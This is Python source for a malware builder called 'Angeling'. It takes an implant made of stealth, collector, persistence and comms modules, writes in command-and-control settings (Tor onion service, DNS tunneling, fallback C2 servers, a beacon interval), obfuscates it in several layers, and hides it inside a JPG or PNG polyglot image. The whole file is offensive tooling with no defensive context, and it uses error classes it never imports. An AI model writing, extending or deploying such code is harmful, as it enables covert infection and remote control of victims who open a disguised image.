import os
import sys
import json
import shutil
import argparse
import tempfile
import subprocess
from pathlib import Path
from typing import Dict, Any, Optional
from core.crypter import Crypter
from core.obfuscator import CodeObfuscator
from core.resilience import ResilienceManager
from core.integrator import SystemIntegrator
from modules.polyglot import PolyglotBuilder

class AngelBuilder:
    def __init__(self):
        # Initialize system integrator
        self.integrator = SystemIntegrator()
        self.crypter = Crypter()
        self.obfuscator = self.integrator.obfuscator
        self.polyglot = PolyglotBuilder()
        self.build_dir = Path(tempfile.mkdtemp())
        self.resilience = self.integrator.resilience
        
    def create_config(self, args: argparse.Namespace) -> Dict[str, Any]:
        """Create configuration from arguments"""
        config = {
            'onion_services': [args.onion] if args.onion else [],
            'dns_zone': args.dns_zone,
            'dns_servers': args.dns_servers.split(',') if args.dns_servers else ['8.8.8.8'],
            'beacon_interval': args.beacon_interval,
            'stealth_level': args.stealth_level,
            'c2_servers': args.c2_servers.split(',') if args.c2_servers else [],
            # Nouvelles configurations
            'resilience': {
                'backup_interval': 3600,
                'max_retries': 3,
                'retry_delay': 5,
                'error_thresholds': {
                    'LOW': 10,
                    'MEDIUM': 5,
                    'HIGH': 3,
                    'FATAL': 1
                }
            },
            'obfuscation': {
                'enabled': True,
                'complexity': 3,
                'layers': [
                    'rename',
                    'flow_control',
                    'string_encode',
                    'dead_code'
                ]
            }
        }
        
        # Remove None values
        return {k: v for k, v in config.items() if v is not None}
        
    def prepare_build_directory(self):
        """Prepare build directory with required files"""
        try:
            # Create directories
            (self.build_dir / 'core').mkdir(exist_ok=True)
            (self.build_dir / 'modules').mkdir(exist_ok=True)
            (self.build_dir / 'config').mkdir(exist_ok=True)
            
            # Copy core files
            core_files = [
                'crypter.py', 'obfuscator.py', 'stealth.py', 'brain.py',
                'resilience.py', 'integrator.py'
            ]
            for file in core_files:
                shutil.copy2(f'core/{file}', self.build_dir / 'core' / file)
                
            # Copy module files
            module_files = [
                'collector.py', 'network.py', 'router.py', 
                'comms.py', 'persistence.py'
            ]
            for file in module_files:
                shutil.copy2(f'modules/{file}', self.build_dir / 'modules' / file)
                
            # Copy config files
            shutil.copy2('config/settings.py', self.build_dir / 'config' / 'settings.py')
                
            # Copy main file
            shutil.copy2('main.py', self.build_dir / 'main.py')
            
        except Exception as e:
            self.resilience.handle_error(
                e,
                ErrorCategory.FILESYSTEM,
                ErrorSeverity.HIGH
            )
            raise
            
    def build_payload(self, config: Dict[str, Any]) -> str:
        """Build the payload code"""
        try:
            # Read main script
            with open(self.build_dir / 'main.py', 'r') as f:
                main_code = f.read()
                
            # Inject configuration
            config_code = f'''
if __name__ == "__main__":
    config = {json.dumps(config, indent=4)}
    angel = Angel(config)
    angel.run()
'''
            main_code = main_code.replace('if __name__ == "__main__":\n    main()', config_code)
            
            # Obfuscate le code avec plusieurs couches
            obfuscated_code = main_code
            for layer in config['obfuscation']['layers']:
                obfuscated_code = self.obfuscator.obfuscate_code(
                    obfuscated_code,
                    method=layer,
                    complexity=config['obfuscation']['complexity']
                )
                
            return obfuscated_code
            
        except Exception as e:
            self.resilience.handle_error(
                e,
                ErrorCategory.PROCESS,
                ErrorSeverity.HIGH
            )
            raise
            
    def build_image(self, args: argparse.Namespace) -> Optional[str]:
        """Build the final polyglot image"""
        try:
            # Create configuration
            config = self.create_config(args)
            
            # Prepare build environment
            self.prepare_build_directory()
            
            # Build payload
            payload = self.build_payload(config)
            
            # Create polyglot
            polyglot_data = self.polyglot.create_polyglot(
                payload,
                args.image
            )
            
            # Write output file
            with open(args.output, 'wb') as f:
                f.write(polyglot_data)
                
            print(f"\n[+] Successfully created polyglot image: {args.output}")
            print(f"[+] Configuration:")
            print(f"    - Onion Service: {args.onion if args.onion else 'None'}")
            print(f"    - DNS Zone: {args.dns_zone if args.dns_zone else 'None'}")
            print(f"    - Stealth Level: {args.stealth_level}")
            print(f"    - Beacon Interval: {args.beacon_interval} seconds")
            
            return args.output
            
        except Exception as e:
            print(f"\n[-] Error building image: {e}")
            return None
        finally:
            # Cleanup
            try:
                shutil.rmtree(self.build_dir)
            except:
                pass
                
    def validate_image(self, image_path: str) -> bool:
        """Validate that the image file is suitable"""
        if not os.path.exists(image_path):
            print(f"[-] Image file not found: {image_path}")
            return False
            
        ext = image_path.lower()
        if not (ext.endswith('.jpg') or ext.endswith('.jpeg') or ext.endswith('.png')):
            print("[-] Unsupported image format. Use JPG or PNG")
            return False
            
        if os.path.getsize(image_path) > 10 * 1024 * 1024:  # 10MB
            print("[-] Image file too large. Keep it under 10MB")
            return False
            
        return True
        
def main():
    parser = argparse.ArgumentParser(
        description="Angeling Polyglot Image Builder",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    # Required arguments
    parser.add_argument('--image', required=True,
                       help='Source image file (JPG/PNG)')
    parser.add_argument('--output', required=True,
                       help='Output image file')
                       
    # Communication options
    parser.add_argument('--onion',
                       help='Tor onion service address')
    parser.add_argument('--dns-zone',
                       help='DNS zone for tunneling')
    parser.add_argument('--dns-servers',
                       help='Comma-separated list of DNS servers')
    parser.add_argument('--c2-servers',
                       help='Comma-separated list of fallback C2 servers')
                       
    # Behavior options
    parser.add_argument('--stealth-level',
                       choices=['low', 'medium', 'high'],
                       default='medium',
                       help='Stealth level')
    parser.add_argument('--beacon-interval',
                       type=int,
                       default=300,
                       help='Beacon interval in seconds')
                       
    args = parser.parse_args()
    
    # Create builder
    builder = AngelBuilder()
    
    # Validate input image
    if not builder.validate_image(args.image):
        return
        
    # Ensure at least one communication method
    if not any([args.onion, args.dns_zone, args.c2_servers]):
        print("[-] Error: Specify at least one communication method:")
        print("    --onion, --dns-zone, or --c2-servers")
        return
        
    # Build image
    output = builder.build_image(args)
    if output:
        print("\n[+] Build completed successfully!")
        print(f"[+] Your image is ready: {output}")
    else:
        print("\n[-] Build failed!")
        
if __name__ == "__main__":
    main()
